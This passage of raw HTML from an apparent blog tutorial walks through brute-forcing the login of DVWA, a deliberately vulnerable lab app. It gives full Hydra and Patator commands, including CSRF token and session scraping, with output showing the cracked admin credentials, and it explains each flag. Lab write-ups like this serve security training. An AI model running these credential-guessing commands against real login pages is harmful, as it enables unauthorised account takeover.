&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# rm -f hydra.restore; export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# time hydra -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/500-worst-passwords.txt \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns -u -F -t &lt;span class="m"&gt;1&lt;/span&gt; -w &lt;span class="m"&gt;1&lt;/span&gt; 192.168.1.33 http-post-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;WARNING&lt;span class="o"&gt;]&lt;/span&gt; the waittime you &lt;span class="nb"&gt;set &lt;/span&gt;is low, this can result in erroneous results
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-15 22:11:46
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Using HTTP Proxy: http://127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;1&lt;/span&gt; task per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;5522&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:11/p:502&lt;span class="o"&gt;)&lt;/span&gt;, ~86 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-post-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.33   login: admin   password: password
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.33 &lt;span class="o"&gt;(&lt;/span&gt;valid pair found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-15 22:12:25
&lt;/span&gt;&lt;span class="line"&gt;hydra -L /usr/share/seclists/Usernames/top_shortlist.txt -P  -e ns -u -F -t &lt;span class="m"&gt;1&lt;/span&gt;  0.02s user 0.00s system 0% cpu 39.407 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Hydra Brute Forcing" src="https://blog.g0tmi1k.com/images/dvwa-login-23.png" /&gt;&lt;/p&gt;

&lt;p&gt;The first three commands are nothing new. I will break down the last command, the main Hydra command (which is not too different and will highlight in bold what is different).&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;-L /usr/share/seclists/Usernames/top_shortlist.txt&lt;/code&gt; - A wordlist of usernames&lt;/strong&gt; &lt;em&gt;(only 11)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;-P /usr/share/seclists/Passwords/500-worst-passwords.txt&lt;/code&gt; - A wordlist of passwords&lt;/strong&gt; &lt;em&gt;(only 500)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e ns&lt;/code&gt; - empty password &amp;amp; login as password &lt;em&gt;(so 2x the amount of usernames for the total number of requests)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; - loop username first, rather than password _(so now it will try the first password for all the usernames then the next one, rather than focusing on just a single user)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-F&lt;/code&gt; - quit after finding any login credentials &lt;em&gt;(regardless of the user account)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;-t 1&lt;/code&gt; - 1 thread (Limiting to just 1 due to target. More on this later)&lt;/strong&gt; &lt;strong&gt;[*]&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;-w 1&lt;/code&gt; - timeout value for each thread (We do not need as much leeway now)&lt;/strong&gt; &lt;strong&gt;[*]&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.33&lt;/code&gt; - IP/hostname of the machine to attack&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http-post-form&lt;/code&gt; - module and method to use&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/DVWA/login.php&lt;/code&gt; - path to the page&lt;/li&gt;
&lt;li&gt;&lt;code&gt;username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&lt;/code&gt; - POST data to send&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;S=Location\: index.php&lt;/code&gt; - Looking for page response which ONLY contains this (Whitelisting)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&lt;/code&gt; - the cookie values to send during brute force&lt;/li&gt;
&lt;li&gt;&lt;code&gt;time&lt;/code&gt; - this will just give us stats showing how long the command took to run (so how long it took to brute force. Bash fu!)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Dropped &lt;code&gt;-W 1&lt;/code&gt; (Sleep after thread), &lt;code&gt;-v&lt;/code&gt; (less verbose. Do not need redirects), &lt;code&gt;-V&lt;/code&gt; from before (show logins) &amp;amp; &lt;code&gt;C=/404.php&lt;/code&gt; (no need due to Burp)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;[*]&lt;/strong&gt; = These are very low because the target had issues doing multiple threads and a LAN target. Normally these values would be larger (&lt;code&gt;-t 5 -w 30&lt;/code&gt;) depending on the networking connection and how well the target responds.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Brute.Force..Patator."&gt;&lt;/a&gt;
&lt;h2&gt;Brute Force (Patator)&lt;/h2&gt;

&lt;a name="Patator..Documentation."&gt;&lt;/a&gt;
&lt;h3&gt;Patator (Documentation)&lt;/h3&gt;

&lt;p&gt;Quoting the README file: &lt;em&gt;"Patator is NOT script-kiddie friendly, please read the README inside patator.py before reporting."&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;However, Patator is incredibly powerful. Even if it is not written in C (which means it uses more system resources), it has an awful lot more features and options than Hydra. However, It is not straightforward to use, and it is not well documented. But I still find it is worth it =).&lt;/p&gt;

&lt;p&gt;Once again, let's read up, what does what, and think about what we need.&lt;/p&gt;

&lt;p&gt;The README also does state to check the comments in the code (there is some unique information located here). I also found checking a few functions in the source code to be helpful to (to get a better understanding) - it is written in Python so is not too hard to understand.&lt;/p&gt;

&lt;p&gt;Offline: &lt;code&gt;less $(which patator)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Online: &lt;a href="https://github.com/lanjelot/patator/"&gt;https://github.com/lanjelot/patator/&lt;/a&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;patator
&lt;/span&gt;&lt;span class="line"&gt;patator http_fuzz --help
&lt;/span&gt;&lt;span class="line"&gt;*patator comments &lt;span class="o"&gt;(&lt;/span&gt;all in the header at the top&lt;span class="o"&gt;)&lt;/span&gt;*.
&lt;/span&gt;&lt;span class="line"&gt;*patator &lt;span class="nb"&gt;source &lt;/span&gt;code*.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;Once again, I will exact the certain sections which we should find useful:&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;url                : main url to target &lt;span class="o"&gt;(&lt;/span&gt;scheme://host&lt;span class="o"&gt;[&lt;/span&gt;:port&lt;span class="o"&gt;]&lt;/span&gt;/path?query&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;body               : body data
&lt;/span&gt;&lt;span class="line"&gt;header             : use custom headers
&lt;/span&gt;&lt;span class="line"&gt;method             : method to use &lt;span class="o"&gt;[&lt;/span&gt;GET &lt;span class="p"&gt;|&lt;/span&gt; POST &lt;span class="p"&gt;|&lt;/span&gt; HEAD &lt;span class="p"&gt;|&lt;/span&gt; ...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;follow             : follow any Location redirect &lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="p"&gt;|&lt;/span&gt;1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;accept_cookie      : save received cookies to issue them in future requests &lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="p"&gt;|&lt;/span&gt;1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;http_proxy         : HTTP proxy to use &lt;span class="o"&gt;(&lt;/span&gt;host:port&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;timeout            : seconds to &lt;span class="nb"&gt;wait &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; a HTTP response &lt;span class="o"&gt;[&lt;/span&gt;20&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;--rate-limit&lt;span class="o"&gt;=&lt;/span&gt;N     : &lt;span class="nb"&gt;wait &lt;/span&gt;N seconds between tests &lt;span class="o"&gt;(&lt;/span&gt;default is 0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;-t N, --threads&lt;span class="o"&gt;=&lt;/span&gt;N  : number of threads &lt;span class="o"&gt;(&lt;/span&gt;default is 10&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;-x arg             : actions and conditions, see Syntax below
&lt;/span&gt;&lt;span class="line"&gt;actions            :&lt;span class="o"&gt;=&lt;/span&gt; action&lt;span class="o"&gt;[&lt;/span&gt;,action&lt;span class="o"&gt;]&lt;/span&gt;*
&lt;/span&gt;&lt;span class="line"&gt;action             :&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ignore&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;retry&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;free&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;quit&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;reset&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;conditions         :&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;condition&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;value&lt;span class="o"&gt;[&lt;/span&gt;,condition&lt;span class="o"&gt;=&lt;/span&gt;value&lt;span class="o"&gt;]&lt;/span&gt;*
&lt;/span&gt;&lt;span class="line"&gt;condition          :&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;code&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;size&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;mesg&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;fgrep&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;egrep&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;clen&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;ignore             : &lt;span class="k"&gt;do&lt;/span&gt; not report
&lt;/span&gt;&lt;span class="line"&gt;quit               : terminate execution now
&lt;/span&gt;&lt;span class="line"&gt;code               : match status code
&lt;/span&gt;&lt;span class="line"&gt;size               : match size &lt;span class="o"&gt;(&lt;/span&gt;N or N-M or N- or -N&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;mesg               : match message
&lt;/span&gt;&lt;span class="line"&gt;fgrep              : search &lt;span class="k"&gt;for&lt;/span&gt; string
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;Patator is a bit more feature rich (and the bugs it has are different), as a result it means we do not have to use a proxy in the "final" command.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="L.strong.Patator.Main.Command..strong."&gt;&lt;/a&gt;
&lt;h3&gt;&lt;strong&gt;Patator Main Command&lt;/strong&gt;&lt;/h3&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# time  patator  http_fuzz  method=POST \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.33/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/500-worst-passwords.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username=FILE1&amp;amp;password=FILE0&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="nv"&gt;accept_cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x ignore:fgrep&lt;span class="o"&gt;=&lt;/span&gt;login.php  -x quit:fgrep&lt;span class="o"&gt;=&lt;/span&gt;index.php &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;http_proxy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;127.0.0.1:8080 &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;3
&lt;/span&gt;&lt;span class="line"&gt;18:17:06 patator    INFO - Starting Patator v0.5 &lt;span class="o"&gt;(&lt;/span&gt;http://code.google.com/p/patator/&lt;span class="o"&gt;)&lt;/span&gt; at 2015-10-18 18:17 BST
&lt;/span&gt;&lt;span class="line"&gt;18:17:06 patator    INFO -
&lt;/span&gt;&lt;span class="line"&gt;18:17:06 patator    INFO - code size:clen     &lt;span class="p"&gt;|&lt;/span&gt; candidate                        &lt;span class="p"&gt;|&lt;/span&gt;   num &lt;span class="p"&gt;|&lt;/span&gt; mesg
&lt;/span&gt;&lt;span class="line"&gt;18:17:06 patator    INFO - ----------------------------------------------------------------------
&lt;/span&gt;&lt;span class="line"&gt;18:17:20 patator    INFO - &lt;span class="m"&gt;302&lt;/span&gt;  344:0         &lt;span class="p"&gt;|&lt;/span&gt; password:admin                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;13&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;302&lt;/span&gt; Found
&lt;/span&gt;&lt;span class="line"&gt;18:17:21 patator    INFO - Hits/Done/Skip/Fail/Size: 1/14/0/0/5500, Avg: &lt;span class="m"&gt;0&lt;/span&gt; r/s, Time: 0h 0m 15s
&lt;/span&gt;&lt;span class="line"&gt;18:17:21 patator    INFO - To resume execution, pass --resume 14
&lt;/span&gt;&lt;span class="line"&gt;patator http_fuzz &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;POST &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.33/DVWA/login.php&amp;quot;&lt;/span&gt;         0.71s user 0.05s system 4% cpu 16.246 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Patator Brute Forcing" src="https://blog.g0tmi1k.com/images/dvwa-login-25.png" /&gt;&lt;/p&gt;

&lt;p&gt;Just note how &lt;code&gt;password:username&lt;/code&gt; is the other way around to Hydra? This is because of how the numbering of the wordlist is defined (due to which values are cycled through first). This will act the same as &lt;code&gt;-u&lt;/code&gt; would in Hydra (to work "better" when brute forcing multiple usernames as there is a good chance multiple users have used the same password).&lt;/p&gt;

&lt;p&gt;The command can be broken down like so:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;time&lt;/code&gt; - This is another application, that calculates various timing performances on the program it executes. We are using it to time (and benchmark) how long the app runs for (aka how long does it take to brute force).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;patator&lt;/code&gt; - the main program itself.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http_fuzz&lt;/code&gt; - the module to use. This is the protocol that we will be attacking.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;method=POST&lt;/code&gt; - how to send the data.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;url="http://192.168.1.33/DVWA/login.php"&lt;/code&gt; - the full URL to the web page.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1=/usr/share/seclists/Usernames/top_shortlist.txt 0=/usr/share/seclists/Passwords/500-worst-passwords.txt&lt;/code&gt; - defining the wordlists to use (passwords before usernames).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;body="username=FILE1&amp;amp;password=FILE0&amp;amp;user_token=${CSRF}&amp;amp;Login=Login"&lt;/code&gt; – how to use the word lists in the request.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;header="Cookie: security=impossible; PHPSESSID=${SESSIONID}"&lt;/code&gt; - setting the cookie values.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;follow=0&lt;/code&gt; - not to follow any redirects found.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;accept_cookie=0&lt;/code&gt; - not to set any cookie values.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-x ignore:fgrep=login.php&lt;/code&gt; - blacklisting, any pages which include &lt;code&gt;login.php&lt;/code&gt;, is not what we are looking for - so print it out.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-x quit:fgrep=index.php&lt;/code&gt; - whitelisting, any pages which does include &lt;code&gt;index.php&lt;/code&gt;, quit as straight away as it is found (and print out the value).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http_proxy=127.0.0.1:8080&lt;/code&gt; - to use a proxy (e.g. Burp). &lt;strong&gt;Not needed at this stage for anything other than debugging. Can be dropped.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--threads=1&lt;/code&gt; - how many threads to use. &lt;strong&gt;[*]&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;timeout=3&lt;/code&gt; - how many seconds to wait for a response. &lt;strong&gt;[*]&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;[*]&lt;/strong&gt; = These are very low because the target had issues doing multiple threads and a LAN target. Normally these values would be larger (&lt;code&gt;--threads=5 timeout=30&lt;/code&gt;) depending on the networking connection and how well the target responds.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Patator.vs.Hydra..Syntax.Comparison."&gt;&lt;/a&gt;
&lt;h3&gt;Patator vs Hydra (Syntax Comparison)&lt;/h3&gt;

&lt;p&gt;Trying to compare the commands directly to Hydra and Patator:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hydra&lt;/strong&gt;
&lt;code&gt;hydra -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/500-worst-passwords.txt -e ns -u -F -t 1 -w 1 -W 1 192.168.1.33 http-post-form "/DVWA/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}"&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Patator&lt;/strong&gt;
